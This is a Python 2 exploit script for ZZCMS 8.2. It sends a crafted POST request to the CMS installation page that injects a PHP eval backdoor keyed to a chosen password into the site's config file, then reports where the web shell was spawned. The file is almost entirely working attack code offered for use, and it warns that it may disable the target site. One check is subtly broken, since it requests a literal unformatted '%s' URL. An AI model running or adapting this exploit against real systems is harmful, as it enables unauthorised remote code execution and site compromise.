import requests


# Exploit found by BREACHERS
# No referer


def info(): # Exploit information for database mechanism
    info = {
        'name': 'zzcms_82_getshell',
        'description': 'ZZCMS 8.2 Getshell',
        'date': '2018-12-27',
        'parameters':{
            'url': 'Target URL',
            'password': 'Shell password',
            'timeout': 'Request timeout'
        },
        'referer': 'None'
    }
    return info



class exploit():
    def __init__(self):
        self.param = {'url': None, 'password': None, 'timeout': 3}
        pass


    def exploit(self):
        try:
            timeout = int(self.param['timeout'])
            print '[*] Trying find installation page.'
            if requests.get('http://%s/install/', timeout=timeout).status_code == 404:
                print '[!] Installation page not found.'
                return
            if raw_input('[*] This exploit may MAKE THE SITE DISABLED, continue?(Y/N)').upper() != 'Y':
                return
            print '[*] Generating payload.'
            payload = ''
            payload += 'local=localhost&user=test%27%29%3B%40eval%28%24_POST%5B%27'
            payload += str(self.param['password'])
            payload += '%27%5D%29%3B&password=test%27%29%3B%40eval%28%24_POST%5B%27'
            payload += str(self.param['password'])
            payload += '%27%5D%29%3B&date=test%27%29%3B%40eval%28%24_POST%5B%27'
            payload += str(self.param['password'])
            payload += '%27%5D%29%3B&pre=zzcms_&pass=zzcms&install=%E4%B8%8B%E4%B8%80%E6%AD%A5'
            print '[*] Sending payload.'
            requests.post('http://%s/install/index.php?action=setp1' %(self.param['url']), payload, timeout=timeout)
            print '[+] Payload send completed.'
            print '[+] Backdoor spawned at http://%s/include/zc_config.php' %(self.param['url'])
        except Exception, e:
            print '[!] Failed to exploit: %s' %(str(e))
        return


    def info(self):
        ExpInf = info()
        print '[*] Incoming exploit information.'
        print ' |   NAME: %s' %(ExpInf['name'])
        print ' |   DESCRIPTION: %s' %(ExpInf['description'])
        print ' |   DATE: %s' %(ExpInf['date'])
        print ' |   PARAMETERS:'
        parameters = ExpInf['parameters']
        for item in ExpInf['parameters'].keys():
            print ' |   |  %s: %s' %(item, parameters[item])
        print ' |   REFERER: %s' %(ExpInf['referer'])
        return
